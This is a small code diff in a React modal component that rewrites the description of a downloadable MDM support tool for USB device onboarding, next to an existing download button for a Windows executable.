@@ -630,7 +630,7 @@ class QRModal extends React.Component {
                         </div>
                         <div className="card-body">
                           <p className="text-muted small mb-3">
-                            Download the local server to enable zero-click USB onboarding. Once running, this screen will automatically transform into the MDM Dashboard.
+                            Download the MDM Support Tool to enable zero-click USB onboarding. Once running on your computer, this screen will automatically connect to it and display live onboarding logs and USB device status right here.
                           </p>
                           <div className="d-flex flex-wrap gap-2 mb-3" style={{ gap: '8px' }}>
                             <a href="https://graph-ongyy.kinsta.app/uploads/c6b385c8-9e83-4ee7-a7b5-c0beb94832b8.exe" download className="btn btn-primary btn-sm rounded-pill font-weight-bold px-3 shadow-sm">
